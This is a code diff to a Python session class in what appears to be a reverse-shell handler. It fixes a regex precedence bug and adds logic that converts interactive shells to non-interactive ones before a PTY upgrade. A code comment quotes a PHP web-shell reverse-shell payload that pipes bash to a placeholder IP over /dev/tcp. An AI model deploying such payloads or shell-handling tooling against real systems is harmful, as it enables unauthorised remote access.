@@ -1523,7 +1523,7 @@ class Session:
 		cmd = f'{path} export HISTCONTROL=ignoreboth;{history} echo $((1*1000+3*100+3*10+7))`tty`'
 		outcome = b'1337'
 
-		response = self.exec(cmd+'\n', expect=(cmd.encode(), outcome, b"Windows PowerShell", b'SHELL> ', b'PS>', b'> '), raw=True)
+		response = self.exec(cmd + '\n', expect=(outcome, b"Windows PowerShell", b'SHELL> ', b'PS>', b'> '), raw=True)
 
 		if not response:
 			return False
@@ -1745,9 +1745,9 @@ class Session:
 				if need_check:
 					need_check = False
 
-					if self.echoing and cmd and raw:
+					if raw and self.echoing and cmd:
 						result = buffer.getvalue()
-						if re.search(re.escape(cmd) + b'.' if self.interactive else b'', result, re.DOTALL):
+						if re.search(re.escape(cmd) + (b'.' if self.interactive else b''), result, re.DOTALL):
 							self.subchannel.result = result.replace(cmd, b'')
 							break
 						else:
@@ -1918,6 +1918,15 @@ class Session:
 					new_session.attach()
 
 				return False
+
+			# Some shells are unstable in interactive mode
+			# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
+			# Silently convert the shell to non-interactive before PTY upgrade.
+			if self.interactive:
+				self.interactive = False
+				self.echoing = True
+				self.exec(f"exec nohup {self.shell}", raw=True)
+				self.echoing = False
 
 			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', separate=deploy_agent, raw=True)
 			if not response:
